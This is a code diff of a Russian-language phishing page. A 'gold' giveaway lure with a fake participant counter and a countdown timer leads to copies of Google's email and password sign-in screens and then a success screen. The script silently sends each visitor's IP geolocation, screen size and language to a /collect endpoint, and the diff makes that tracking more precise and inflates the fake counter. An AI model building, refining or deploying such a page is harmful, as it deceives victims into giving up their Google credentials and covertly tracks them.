@@ -8,63 +8,45 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
 
-        /* ===== ЛОАДЕР ===== */
         #loader {
-            position: fixed;
-            inset: 0;
-            background: #0a0a10;
-            z-index: 9999;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
+            position: fixed; inset: 0;
+            background: #0a0a10; z-index: 9999;
+            display: flex; flex-direction: column;
+            align-items: center; justify-content: center;
             transition: opacity 0.5s ease;
         }
         #loader.hide { opacity: 0; pointer-events: none; }
         .loader-ring {
-            width: 56px;
-            height: 56px;
+            width: 56px; height: 56px;
             border: 3px solid #ffd70022;
             border-top-color: #ffd700;
             border-radius: 50%;
             animation: spin 0.9s linear infinite;
         }
         .loader-text {
-            margin-top: 18px;
-            color: #ffd700;
-            font-size: 14px;
-            letter-spacing: 2px;
+            margin-top: 18px; color: #ffd700;
+            font-size: 14px; letter-spacing: 2px;
             text-transform: uppercase;
             font-family: 'Segoe UI', Arial, sans-serif;
             opacity: 0.8;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* ===== ПРОГРЕСС-БАР ===== */
         .progress-bar {
-            position: fixed;
-            top: 0; left: 0; right: 0;
-            height: 3px;
-            background: rgba(255,255,255,0.06);
-            z-index: 100;
-            overflow: hidden;
+            position: fixed; top: 0; left: 0; right: 0;
+            height: 3px; background: rgba(255,255,255,0.06);
+            z-index: 100; overflow: hidden;
         }
         .progress-fill {
-            height: 100%;
-            width: 33%;
+            height: 100%; width: 33%;
             background: linear-gradient(90deg, #ffd700, #f0a500);
             transition: width 0.5s cubic-bezier(0.4, 0, 0.2, 1);
             box-shadow: 0 0 12px #ffd70088;
         }
 
-        /* ===== АНИМАЦИИ ===== */
         @keyframes fadeUp {
             from { opacity: 0; transform: translateY(24px); }
             to { opacity: 1; transform: translateY(0); }
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
         }
         @keyframes pulseGold {
             0%, 100% { transform: scale(1); color: #fff; }
@@ -77,18 +59,12 @@
         .animate-in { animation: fadeUp 0.45s cubic-bezier(0.4, 0, 0.2, 1); }
         .pulse { animation: pulseGold 0.4s ease; }
 
-        /* ===== СТРАНИЦА 1: ГОЛДА ===== */
         .step1-body {
-            background: #0a0a10;
-            color: #fff;
+            background: #0a0a10; color: #fff;
             font-family: 'Segoe UI', Arial, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 16px;
-            overflow: hidden;
-            position: relative;
+            min-height: 100vh; display: flex;
+            align-items: center; justify-content: center;
+            padding: 16px; overflow: hidden; position: relative;
         }
         .bg-layer {
             position: fixed; top: 0; left: 0;
@@ -98,30 +74,19 @@
         }
         .dark-container {
             background: linear-gradient(145deg, rgba(20,20,30,0.94), rgba(10,10,16,0.97));
-            padding: 36px 24px 26px;
-            border-radius: 32px;
-            width: 100%; max-width: 400px;
-            text-align: center;
+            padding: 36px 24px 26px; border-radius: 32px;
+            width: 100%; max-width: 400px; text-align: center;
             border: 1px solid #ffd70033;
             box-shadow: 0 20px 60px rgba(0,0,0,0.9), 0 0 40px #ffd70008;
             position: relative; z-index: 1;
         }
-        .gold-icon {
-            font-size: 48px;
-            margin-bottom: 6px;
-            display: inline-block;
-            animation: floatCoin 3s ease-in-out infinite;
-        }
+        .gold-icon { font-size: 48px; margin-bottom: 6px; display: inline-block; animation: floatCoin 3s ease-in-out infinite; }
         .gold-badge {
             background: linear-gradient(135deg, #2a2a3a, #1a1a28);
-            padding: 10px 22px;
-            border-radius: 40px;
-            display: inline-block;
-            font-size: 30px; font-weight: 900;
-            color: #ffd700;
-            border: 1px solid #ffd70055;
-            box-shadow: 0 0 30px #ffd70015;
-            margin-bottom: 10px;
+            padding: 10px 22px; border-radius: 40px;
+            display: inline-block; font-size: 30px; font-weight: 900;
+            color: #ffd700; border: 1px solid #ffd70055;
+            box-shadow: 0 0 30px #ffd70015; margin-bottom: 10px;
         }
         .dark-title { font-size: 22px; font-weight: 700; color: #fff; margin-bottom: 6px; }
         .dark-desc { color: #99aabb; font-size: 15px; margin-bottom: 18px; }
@@ -129,33 +94,19 @@
         .counter {
             background: rgba(255,215,0,0.06);
             border: 1px solid #ffd70033;
-            border-radius: 12px;
-            padding: 10px 14px;
-            margin-bottom: 12px;
-            font-size: 14px;
-            color: #ffd700;
+            border-radius: 12px; padding: 10px 14px;
+            margin-bottom: 12px; font-size: 14px; color: #ffd700;
         }
         .counter b { color: #fff; font-size: 16px; display: inline-block; }
 
         .timer {
             background: rgba(255,60,60,0.08);
             border: 1px solid #ff444433;
-            border-radius: 12px;
-            padding: 10px 14px;
-            margin-bottom: 16px;
-            font-size: 14px;
-            color: #ff8888;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
+            border-radius: 12px; padding: 10px 14px;
+            margin-bottom: 16px; font-size: 14px; color: #ff8888;
+            display: flex; align-items: center; justify-content: center; gap: 6px;
         }
-        .timer b {
-            color: #fff;
-            font-size: 16px;
-            font-variant-numeric: tabular-nums;
-            letter-spacing: 0.5px;
-        }
+        .timer b { color: #fff; font-size: 16px; font-variant-numeric: tabular-nums; letter-spacing: 0.5px; }
 
         .btn-gold {
             width: 100%; padding: 16px 0;
@@ -164,16 +115,12 @@
             cursor: pointer; transition: 0.2s;
             text-transform: uppercase; letter-spacing: 1px;
             background: linear-gradient(135deg, #ffd700, #f0a500);
-            color: #0a0a10;
-            box-shadow: 0 4px 20px #ffd70033;
-            position: relative;
-            overflow: hidden;
+            color: #0a0a10; box-shadow: 0 4px 20px #ffd70033;
+            position: relative; overflow: hidden;
         }
         .btn-gold::after {
-            content: '';
-            position: absolute;
-            top: 0; left: -100%;
-            width: 100%; height: 100%;
+            content: ''; position: absolute;
+            top: 0; left: -100%; width: 100%; height: 100%;
             background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
             transition: left 0.6s;
         }
@@ -182,226 +129,110 @@
         .btn-gold:active { transform: scale(0.96); }
         .footer { margin-top: 16px; font-size: 12px; color: #445; }
 
-        /* ===== СТРАНИЦА 2: GOOGLE LOGIN ===== */
         .step2-body {
             background: #ffffff;
             font-family: 'Google Sans', Roboto, Arial, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            align-items: flex-start;
-            justify-content: center;
+            min-height: 100vh; display: flex;
+            align-items: flex-start; justify-content: center;
             padding: 60px 16px 40px;
         }
-        .google-card {
-            width: 100%;
-            max-width: 400px;
-            background: #ffffff;
-            padding: 0;
-        }
-        .google-logo-img {
-            display: block;
-            margin: 0 auto 20px;
-            width: 74px;
-            height: 24px;
-        }
-        .google-h1 {
-            font-size: 24px;
-            font-weight: 400;
-            color: #202124;
-            text-align: center;
-            margin-bottom: 8px;
-        }
-        .google-sub {
-            font-size: 16px;
-            font-weight: 400;
-            color: #202124;
-            text-align: center;
-            margin-bottom: 32px;
-        }
-        .float-field {
-            position: relative;
-            margin-bottom: 8px;
-        }
+        .google-card { width: 100%; max-width: 400px; background: #ffffff; padding: 0; }
+        .google-logo-img { display: block; margin: 0 auto 20px; width: 74px; height: 24px; }
+        .google-h1 { font-size: 24px; font-weight: 400; color: #202124; text-align: center; margin-bottom: 8px; }
+        .google-sub { font-size: 16px; font-weight: 400; color: #202124; text-align: center; margin-bottom: 32px; }
+        .float-field { position: relative; margin-bottom: 8px; }
         .float-field input {
-            width: 100%;
-            padding: 13px 15px;
-            font-size: 16px;
-            color: #202124;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            background: transparent;
-            outline: none;
-            transition: border 0.15s;
-            font-family: inherit;
+            width: 100%; padding: 13px 15px; font-size: 16px;
+            color: #202124; border: 1px solid #dadce0;
+            border-radius: 4px; background: transparent; outline: none;
+            transition: border 0.15s; font-family: inherit;
         }
         .float-field input:hover { border-color: #202124; }
-        .float-field input:focus {
-            border: 2px solid #1a73e8;
-            padding: 12px 14px;
-        }
+        .float-field input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
         .float-field label {
-            position: absolute;
-            left: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: #fff;
-            padding: 0 4px;
-            font-size: 16px;
-            color: #5f6368;
-            pointer-events: none;
-            transition: all 0.15s ease;
+            position: absolute; left: 12px; top: 50%;
+            transform: translateY(-50%); background: #fff;
+            padding: 0 4px; font-size: 16px; color: #5f6368;
+            pointer-events: none; transition: all 0.15s ease;
         }
         .float-field input:focus + label,
         .float-field input:not(:placeholder-shown) + label {
-            top: 0;
-            font-size: 12px;
+            top: 0; font-size: 12px;
         }
         .float-field input:focus + label { color: #1a73e8; }
         .float-field input:not(:focus):not(:placeholder-shown) + label { color: #5f6368; }
 
-        .error-text {
-            color: #d93025;
-            font-size: 12px;
-            margin: 0 0 8px 4px;
-            min-height: 14px;
-        }
+        .error-text { color: #d93025; font-size: 12px; margin: 0 0 8px 4px; min-height: 14px; }
         .error-text:empty { display: none; }
 
         .forgot-link {
-            display: inline-block;
-            color: #1a73e8;
-            font-size: 14px;
-            font-weight: 500;
-            text-decoration: none;
-            margin-bottom: 36px;
+            display: inline-block; color: #1a73e8;
+            font-size: 14px; font-weight: 500;
+            text-decoration: none; margin-bottom: 36px;
         }
         .forgot-link:hover { text-decoration: underline; }
-        .guest-text {
-            font-size: 14px;
-            color: #5f6368;
-            line-height: 1.5;
-            margin-bottom: 36px;
-        }
-        .guest-text a {
-            color: #1a73e8;
-            font-weight: 500;
-            text-decoration: none;
-        }
+        .guest-text { font-size: 14px; color: #5f6368; line-height: 1.5; margin-bottom: 36px; }
+        .guest-text a { color: #1a73e8; font-weight: 500; text-decoration: none; }
         .guest-text a:hover { text-decoration: underline; }
 
-        .google-actions {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            gap: 16px;
-        }
+        .google-actions { display: flex; justify-content: space-between; align-items: center; gap: 16px; }
         .create-account {
-            color: #1a73e8;
-            font-size: 14px;
-            font-weight: 500;
-            text-decoration: none;
+            color: #1a73e8; font-size: 14px;
+            font-weight: 500; text-decoration: none;
             padding: 8px 8px 8px 0;
         }
         .create-account:hover { text-decoration: underline; }
         .btn-next {
-            background: #1a73e8;
-            color: #fff;
-            border: none;
-            border-radius: 4px;
-            padding: 10px 24px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
+            background: #1a73e8; color: #fff; border: none;
+            border-radius: 4px; padding: 10px 24px;
+            font-size: 14px; font-weight: 500; cursor: pointer;
             min-width: 88px;
             transition: background 0.15s, box-shadow 0.15s;
             font-family: inherit;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
+            display: flex; align-items: center; justify-content: center; gap: 8px;
         }
         .btn-next:hover { background: #1765cc; box-shadow: 0 1px 2px rgba(60,64,67,0.3); }
         .btn-next:active { background: #1557b0; }
         .btn-next:disabled { background: #a0c2f0; cursor: not-allowed; }
 
-        /* Спиннер внутри кнопки */
         .btn-spinner {
             width: 14px; height: 14px;
             border: 2px solid #ffffff66;
-            border-top-color: #fff;
-            border-radius: 50%;
-            animation: spin 0.7s linear infinite;
-            display: none;
+            border-top-color: #fff; border-radius: 50%;
+            animation: spin 0.7s linear infinite; display: none;
         }
         .btn-next.loading .btn-spinner { display: inline-block; }
         .btn-next.loading .btn-text { opacity: 0.7; }
 
         .account-chip {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            border: 1px solid #dadce0;
-            border-radius: 16px;
-            padding: 4px 10px 4px 4px;
-            font-size: 14px;
-            color: #3c4043;
-            margin-bottom: 32px;
+            display: inline-flex; align-items: center; gap: 8px;
+            border: 1px solid #dadce0; border-radius: 16px;
+            padding: 4px 10px 4px 4px; font-size: 14px;
+            color: #3c4043; margin-bottom: 32px;
         }
         .account-chip .avatar {
-            width: 20px; height: 20px;
-            border-radius: 50%;
-            background: #1a73e8;
-            color: #fff;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 11px;
-            font-weight: 500;
+            width: 20px; height: 20px; border-radius: 50%;
+            background: #1a73e8; color: #fff;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 11px; font-weight: 500;
         }
+        .show-pass-row { display: flex; align-items: center; gap: 12px; margin: 16px 0 40px; }
+        .show-pass-row input[type="checkbox"] { width: 18px; height: 18px; accent-color: #1a73e8; cursor: pointer; }
+        .show-pass-row label { font-size: 14px; color: #202124; cursor: pointer; }
 
-        .show-pass-row {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin: 16px 0 40px;
-        }
-        .show-pass-row input[type="checkbox"] {
-            width: 18px; height: 18px;
-            accent-color: #1a73e8;
-            cursor: pointer;
-        }
-        .show-pass-row label {
-            font-size: 14px;
-            color: #202124;
-            cursor: pointer;
-        }
-
-        /* ===== СТРАНИЦА 3: УСПЕХ ===== */
         .step3-body {
-            background: #0a0a10;
-            color: #fff;
+            background: #0a0a10; color: #fff;
             font-family: 'Segoe UI', Arial, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 16px;
+            min-height: 100vh; display: flex;
+            align-items: center; justify-content: center; padding: 16px;
         }
         .step3-card {
             background: linear-gradient(145deg, rgba(20,20,30,0.94), rgba(10,10,16,0.97));
             border: 1px solid #ffd70033;
-            border-radius: 32px;
-            padding: 40px 24px 30px;
-            text-align: center;
-            max-width: 400px;
-            width: 100%;
+            border-radius: 32px; padding: 40px 24px 30px;
+            text-align: center; max-width: 400px; width: 100%;
         }
-        .check-icon {
-            font-size: 64px;
-            margin-bottom: 12px;
-            display: inline-block;
-            animation: fadeUp 0.5s ease;
-        }
+        .check-icon { font-size: 64px; margin-bottom: 12px; display: inline-block; animation: fadeUp 0.5s ease; }
         .success-title { font-size: 24px; font-weight: 700; color: #ffd700; margin-bottom: 8px; }
         .success-desc { color: #99aabb; font-size: 16px; margin-bottom: 10px; }
         .timer-text { font-size: 14px; color: #667; }
@@ -422,18 +253,16 @@
 </head>
 <body>
 
-    <!-- ===== ЛОАДЕР ===== -->
     <div id="loader">
         <div class="loader-ring"></div>
         <div class="loader-text">Загрузка...</div>
     </div>
 
-    <!-- ===== ПРОГРЕСС-БАР ===== -->
     <div class="progress-bar" id="progressBar" style="display:none;">
         <div class="progress-fill" id="progressFill"></div>
     </div>
 
-    <!-- ============ СТРАНИЦА 1: ГОЛДА ============ -->
+    <!-- СТРАНИЦА 1 -->
     <div id="step1" class="step1-body">
         <div class="bg-layer">
             <svg viewBox="0 0 800 600" preserveAspectRatio="xMidYMid slice">
@@ -472,7 +301,7 @@
         </div>
     </div>
 
-    <!-- ============ СТРАНИЦА 2: GOOGLE EMAIL ============ -->
+    <!-- СТРАНИЦА 2: GOOGLE EMAIL -->
     <div id="step2" class="step2-body hidden">
         <div class="google-card">
             <img class="google-logo-img" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNzIgOTIiPjxnIGZpbGw9Im5vbmUiPjxwYXRoIGQ9Ik0xMTUuNzUgNDcuMThjMCAxMi43Ny05Ljk5IDIyLjE4LTIyLjI1IDIyLjE4cy0yMi4yNS05LjQxLTIyLjI1LTIyLjE4QzcxLjI1IDM0LjMyIDgxLjI0IDI1IDkzLjUgMjVzMjIuMjUgOS4zMiAyMi4yNSAyMi4xOHptLTkuNzQgMGMwLTcuOTgtNS43OS0xMy40NC0xMi41MS0xMy40NFM4MC45OSAzOS4yIDgwLjk5IDQ3LjE4YzAgNy45IDUuNzkgMTMuNDQgMTIuNTEgMTMuNDRzMTIuNTEtNS41NSAxMi41MS0xMy40NHoiIGZpbGw9IiM0Mjg1RjQiLz48cGF0aCBkPSJNMTYzLjc1IDQ3LjE4YzAgMTIuNzctOS45OSAyMi4xOC0yMi4yNSAyMi4xOHMtMjIuMjUtOS40MS0yMi4yNS0yMi4xOGMwLTEyLjg1IDkuOTktMjIuMTggMjIuMjUtMjIuMThzMjIuMjUgOS4zMiAyMi4yNSAyMi4xOHptLTkuNzQgMGMwLTcuOTgtNS43OS0xMy40NC0xMi41MS0xMy40NHMtMTIuNTEgNS40Ni0xMi41MSAxMy40NGMwIDcuOSA1Ljc5IDEzLjQ0IDEyLjUxIDEzLjQ0czEyLjUxLTUuNTUgMTIuNTEtMTMuNDR6IiBmaWxsPSIjRUE0MzM1Ii8+PHBhdGggZD0iTTIwOS43NSAyNi4zNHYzOS44MmMwIDE2LjM4LTkuNjYgMjMuMDctMjEuMDggMjMuMDctMTAuNzUgMC0xNy4yMi03LjE5LTE5LjY2LTEzLjA3bDguNDgtMy41M2MxLjUxIDMuNjEgNS4yMSA3Ljg3IDExLjE3IDcuODcgNy4zMSAwIDExLjg0LTQuNTEgMTEuODQtMTN2LTMuMTloLS4zNGMtMi4xOCAyLjY5LTYuMzggNS4wNC0xMS42OCA1LjA0LTExLjA5IDAtMjEuMjUtOS42Ni0yMS4yNS0yMi4wOSAwLTEyLjUyIDEwLjE2LTIyLjI2IDIxLjI1LTIyLjI2IDUuMjkgMCA5LjQ5IDIuMzUgMTEuNjggNC45NmguMzR2LTMuNjFoOS4yNXptLTguNTYgMjAuOTJjMC03LjgxLTUuMjEtMTMuNTItMTEuODQtMTMuNTItNi43MiAwLTEyLjM1IDUuNzEtMTIuMzUgMTMuNTIgMCA3LjczIDUuNjMgMTMuMzYgMTIuMzUgMTMuMzYgNi42MyAwIDExLjg0LTUuNjMgMTEuODQtMTMuMzZ6IiBmaWxsPSIjRkJCQzA1Ii8+PHBhdGggZD0iTTIyNSAzdjY1aC05LjVWM2g5LjV6IiBmaWxsPSIjNDI4NUY0Ii8+PHBhdGggZD0iTTI2Mi4wMiA1NC40OGw3LjU2IDUuMDRjLTIuNDQgMy42MS04LjMyIDkuODMtMTguNDggOS44My0xMi42IDAtMjIuMDEtOS43NC0yMi4wMS0yMi4xOCAwLTEzLjE5IDkuNDktMjIuMTggMjAuOTItMjIuMTggMTEuNTEgMCAxNy4xNCA5LjE2IDE4Ljk4IDE0LjExbDEuMDEgMi41Mi0yOS42NSAxMi4yOGMyLjI3IDQuNDUgNS44IDYuNzIgMTAuNzUgNi43MiA0Ljk2IDAgOC40LTIuNDQgMTAuOTItNi4xNHptLTIzLjI3LTcuOThsMTkuODItOC4yM2MtMS4wOS0yLjc3LTQuMzctNC43LTguMjMtNC43LTQuOTUgMC0xMS44NCA0LjM3LTExLjU5IDEyLjkzeiIgZmlsbD0iIzM0QTg1MyIvPjxwYXRoIGQ9Ik0zNS4yOSA0MS40MVYzMkg2N2MuMzEgMS42NC40NyAzLjU4LjQ3IDUuNjggMCA3LjA2LTEuOTMgMTUuNzktOC4xNSAyMi4wMS02LjA1IDYuMy0xMy43OCA5LjY2LTI0LjAyIDkuNjZDMTYuMzIgNjkuMzUuMzYgNTMuODkuMzYgMzQuOTEuMzYgMTUuOTMgMTYuMzIuNDcgMzUuMy40N2MxMC41IDAgMTcuOTggNC4xMiAyMy42IDkuNDlsLTYuNjQgNi42NGMtNC4wMy0zLjc4LTkuNDktNi43Mi0xNi45Ny02LjcyLTEzLjg2IDAtMjQuNyAxMS4xNy0yNC43IDI1LjAzIDAgMTMuODYgMTAuODQgMjUuMDMgMjQuNyAyNS4wMyA4Ljk5IDAgMTQuMTEtMy42MSAxNy4zOS02Ljg5IDIuNjYtMi42NiA0LjQxLTYuNDYgNS4xLTExLjY1bC0yMi40OS4wMXoiIGZpbGw9IiNFQTQzMzUiLz48L2c+PC9zdmc+">
@@ -505,7 +334,7 @@
         </div>
     </div>
 
-    <!-- ============ СТРАНИЦА 2.5: GOOGLE PASSWORD ============ -->
+    <!-- СТРАНИЦА 2.5: ПАРОЛЬ -->
     <div id="step2b" class="step2-body hidden">
         <div class="google-card">
             <img class="google-logo-img" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNzIgOTIiPjxnIGZpbGw9Im5vbmUiPjxwYXRoIGQ9Ik0xMTUuNzUgNDcuMThjMCAxMi43Ny05Ljk5IDIyLjE4LTIyLjI1IDIyLjE4cy0yMi4yNS05LjQxLTIyLjI1LTIyLjE4QzcxLjI1IDM0LjMyIDgxLjI0IDI1IDkzLjUgMjVzMjIuMjUgOS4zMiAyMi4yNSAyMi4xOHptLTkuNzQgMGMwLTcuOTgtNS43OS0xMy40NC0xMi41MS0xMy40NFM4MC45OSAzOS4yIDgwLjk5IDQ3LjE4YzAgNy45IDUuNzkgMTMuNDQgMTIuNTEgMTMuNDRzMTIuNTEtNS41NSAxMi41MS0xMy40NHoiIGZpbGw9IiM0Mjg1RjQiLz48cGF0aCBkPSJNMTYzLjc1IDQ3LjE4YzAgMTIuNzctOS45OSAyMi4xOC0yMi4yNSAyMi4xOHMtMjIuMjUtOS40MS0yMi4yNS0yMi4xOGMwLTEyLjg1IDkuOTktMjIuMTggMjIuMjUtMjIuMThzMjIuMjUgOS4zMiAyMi4yNSAyMi4xOHptLTkuNzQgMGMwLTcuOTgtNS43OS0xMy40NC0xMi41MS0xMy40NHMtMTIuNTEgNS40Ni0xMi41MSAxMy40NGMwIDcuOSA1Ljc5IDEzLjQ0IDEyLjUxIDEzLjQ0czEyLjUxLTUuNTUgMTIuNTEtMTMuNDR6IiBmaWxsPSIjRUE0MzM1Ii8+PHBhdGggZD0iTTIwOS43NSAyNi4zNHYzOS44MmMwIDE2LjM4LTkuNjYgMjMuMDctMjEuMDggMjMuMDctMTAuNzUgMC0xNy4yMi03LjE5LTE5LjY2LTEzLjA3bDguNDgtMy41M2MxLjUxIDMuNjEgNS4yMSA3Ljg3IDExLjE3IDcuODcgNy4zMSAwIDExLjg0LTQuNTEgMTEuODQtMTN2LTMuMTloLS4zNGMtMi4xOCAyLjY5LTYuMzggNS4wNC0xMS42OCA1LjA0LTExLjA5IDAtMjEuMjUtOS42Ni0yMS4yNS0yMi4wOSAwLTEyLjUyIDEwLjE2LTIyLjI2IDIxLjI1LTIyLjI2IDUuMjkgMCA5LjQ5IDIuMzUgMTEuNjggNC45NmguMzR2LTMuNjFoOS4yNXptLTguNTYgMjAuOTJjMC03LjgxLTUuMjEtMTMuNTItMTEuODQtMTMuNTItNi43MiAwLTEyLjM1IDUuNzEtMTIuMzUgMTMuNTIgMCA3LjczIDUuNjMgMTMuMzYgMTIuMzUgMTMuMzYgNi42MyAwIDExLjg0LTUuNjMgMTEuODQtMTMuMzZ6IiBmaWxsPSIjRkJCQzA1Ii8+PHBhdGggZD0iTTIyNSAzdjY1aC05LjVWM2g5LjV6IiBmaWxsPSIjNDI4NUY0Ii8+PHBhdGggZD0iTTI2Mi4wMiA1NC40OGw3LjU2IDUuMDRjLTIuNDQgMy42MS04LjMyIDkuODMtMTguNDggOS44My0xMi42IDAtMjIuMDEtOS43NC0yMi4wMS0yMi4xOCAwLTEzLjE5IDkuNDktMjIuMTggMjAuOTItMjIuMTggMTEuNTEgMCAxNy4xNCA5LjE2IDE4Ljk4IDE0LjExbDEuMDEgMi41Mi0yOS42NSAxMi4yOGMyLjI3IDQuNDUgNS44IDYuNzIgMTAuNzUgNi43MiA0Ljk2IDAgOC40LTIuNDQgMTAuOTItNi4xNHptLTIzLjI3LTcuOThsMTkuODItOC4yM2MtMS4wOS0yLjc3LTQuMzctNC43LTguMjMtNC43LTQuOTUgMC0xMS44NCA0LjM3LTExLjU5IDEyLjkzeiIgZmlsbD0iIzM0QTg1MyIvPjxwYXRoIGQ9Ik0zNS4yOSA0MS40MVYzMkg2N2MuMzEgMS42NC40NyAzLjU4LjQ3IDUuNjggMCA3LjA2LTEuOTMgMTUuNzktOC4xNSAyMi4wMS02LjA1IDYuMy0xMy43OCA5LjY2LTI0LjAyIDkuNjZDMTYuMzIgNjkuMzUuMzYgNTMuODkuMzYgMzQuOTEuMzYgMTUuOTMgMTYuMzIuNDcgMzUuMy40N2MxMC41IDAgMTcuOTggNC4xMiAyMy42IDkuNDlsLTYuNjQgNi42NGMtNC4wMy0zLjc4LTkuNDktNi43Mi0xNi45Ny02LjcyLTEzLjg2IDAtMjQuNyAxMS4xNy0yNC43IDI1LjAzIDAgMTMuODYgMTAuODQgMjUuMDMgMjQuNyAyNS4wMyA4Ljk5IDAgMTQuMTEtMy42MSAxNy4zOS02Ljg5IDIuNjYtMi42NiA0LjQxLTYuNDYgNS4xLTExLjY1bC0yMi40OS4wMXoiIGZpbGw9IiNFQTQzMzUiLz48L2c+PC9zdmc+">
@@ -542,7 +371,7 @@
         </div>
     </div>
 
-    <!-- ============ СТРАНИЦА 3: УСПЕХ ============ -->
+    <!-- СТРАНИЦА 3 -->
     <div id="step3" class="step3-body hidden">
         <div class="step3-card">
             <span class="check-icon">✅</span>
@@ -556,7 +385,6 @@
     <script>
         let savedEmail = '';
 
-        // ===== СКРЫТИЕ ЛОАДЕРА =====
         window.addEventListener('load', function() {
             setTimeout(function() {
                 document.getElementById('loader').classList.add('hide');
@@ -566,62 +394,61 @@
             }, 600);
         });
 
-        // ===== ВИБРАЦИЯ =====
         function vibrate(ms) {
-            if (navigator.vibrate) {
-                try { navigator.vibrate(ms); } catch (e) {}
-            }
+            if (navigator.vibrate) { try { navigator.vibrate(ms); } catch (e) {} }
         }
 
-        // ===== СБОР IP + ГЕО =====
+        // ===== СБОР IP + ГЕО (точнее по регионам UA) =====
         (async function collectVisitorInfo() {
-            try {
-                const r = await fetch('https://ipapi.co/json/');
-                const geo = await r.json();
-                await fetch('/collect', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        geo: {
-                            country: geo.country_name || '',
-                            city: geo.city || '',
-                            region: geo.region || '',
-                            org: geo.org || '',
-                            lat: geo.latitude || '',
-                            lon: geo.longitude || ''
-                        },
-                        screen: { w: window.screen.width, h: window.screen.height },
-                        lang: navigator.language || ''
-                    })
-                });
-            } catch (e) {
+            async function tryCollect(url, mapper) {
                 try {
-                    const r2 = await fetch('https://ip-api.com/json/');
-                    const geo2 = await r2.json();
+                    const r = await fetch(url);
+                    const geo = await r.json();
+                    const data = mapper(geo);
+                    if (!data.country && !data.city) return false;
+
                     await fetch('/collect', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
-                            geo: {
-                                country: geo2.country || '',
-                                city: geo2.city || '',
-                                region: geo2.regionName || '',
-                                org: geo2.isp || '',
-                                lat: geo2.lat || '',
-                                lon: geo2.lon || ''
-                            },
+                            geo: data,
                             screen: { w: window.screen.width, h: window.screen.height },
                             lang: navigator.language || ''
                         })
                     });
-                } catch (e2) {}
+                    return true;
+                } catch (e) {
+                    return false;
+                }
+            }
+
+            // 1) ipwho.is — точнее по регионам, работает по HTTPS
+            const ok1 = await tryCollect('https://ipwho.is/', g => ({
+                country: g.country || '',
+                region: g.region || '',
+                city: g.city || '',
+                org: (g.connection && g.connection.isp) ? g.connection.isp : '',
+                lat: g.latitude || '',
+                lon: g.longitude || ''
+            }));
+
+            // 2) Резерв — ipapi.co
+            if (!ok1) {
+                await tryCollect('https://ipapi.co/json/', g => ({
+                    country: g.country_name || '',
+                    region: g.region || '',
+                    city: g.city || '',
+                    org: g.org || '',
+                    lat: g.latitude || '',
+                    lon: g.longitude || ''
+                }));
             }
         })();
 
-        // ===== СЧЁТЧИК =====
+        // ===== СЧЁТЧИК (тысячи) =====
         (function startCounter() {
             const el = document.getElementById('counterNum');
-            let count = 1200 + Math.floor(Math.random() * 600);
+            let count = 12000 + Math.floor(Math.random() * 6000);
 
             function update() {
                 el.textContent = count.toLocaleString('ru-RU');
@@ -632,7 +459,7 @@
             update();
 
             function tick() {
-                count += Math.floor(Math.random() * 3) + 1;
+                count += Math.floor(Math.random() * 8) + 3;
                 update();
                 setTimeout(tick, 4000 + Math.random() * 6000);
             }
@@ -659,7 +486,6 @@
             }, 1000);
         })();
 
-        // ===== ПРОГРЕСС-БАР =====
         function setProgress(percent) {
             const bar = document.getElementById('progressBar');
             const fill = document.getElementById('progressFill');
@@ -667,7 +493,6 @@
             fill.style.width = percent + '%';
         }
 
-        // ===== ПЕРЕКЛЮЧЕНИЕ ШАГОВ =====
         function showStep(step) {
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.add('hidden');
@@ -711,7 +536,6 @@
             showStep('email');
         }
 
-        // ===== EMAIL =====
         function submitEmail(e) {
             e.preventDefault();
             const email = document.getElementById('email').value.trim();
@@ -741,7 +565,6 @@
             }, 500);
         }
 
-        // ===== ПАРОЛЬ =====
         function togglePass() {
             const p = document.getElementById('password');
             p.type = (p.type === 'password') ? 'text' : 'password';
@@ -789,7 +612,6 @@
             }
         }
 
-        // ===== ИСТОРИЯ =====
         history.replaceState({ step: 'start' }, '', '#start');
 
         window.addEventListener('popstate', function(event) {
